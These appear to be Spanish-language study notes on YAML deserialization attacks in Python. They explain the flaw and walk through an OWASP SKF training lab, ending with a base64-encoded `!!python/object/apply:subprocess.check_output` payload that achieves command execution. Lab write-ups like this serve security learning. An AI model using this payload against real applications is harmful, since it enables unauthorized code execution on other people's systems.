Material de ayuda
it is yaml peter murphy
------------
que es?
Un **Ataque de Deserialización Yaml** (**DES-Yaml**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan **YAML** (**Yet Another Markup Language**) para serializar y deserializar objetos.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada YAML que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada YAML, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Yaml para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema.

----------------

Skf labs/python/yaml
pip2 install pyyaml
python2.7 

tenemos un escenario donde en la url nos aparece un codigo en base 64


	root@parrot /opt/intro_hack/skf-labs/python/DES-Yaml $ echo -n "eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ" | base64 -d; echo
respuesta por consola:

	*yaml: The information page is still under construction, updates coming soon!*

lo que hacemos para cargar un payload es lo siguiente:

	echo -n "yaml: Hola soy ken" | base64
respuesta
	eWFtbDogSG9sYSBzb3kga2Vu

eso lo pegamos en la url y vemos que nos aparece el texto
![[Pasted image 20250419012824.png]]
Nvim data
yaml: !!python/object/apply:subprocess.check_output ['id']

cat data | base64 -w 0; echo

Ese payload en base 64 lo pegamos en la url y PWNED! ya obtuvimos ejecucion de comandos
![[Pasted image 20250419013701.png]]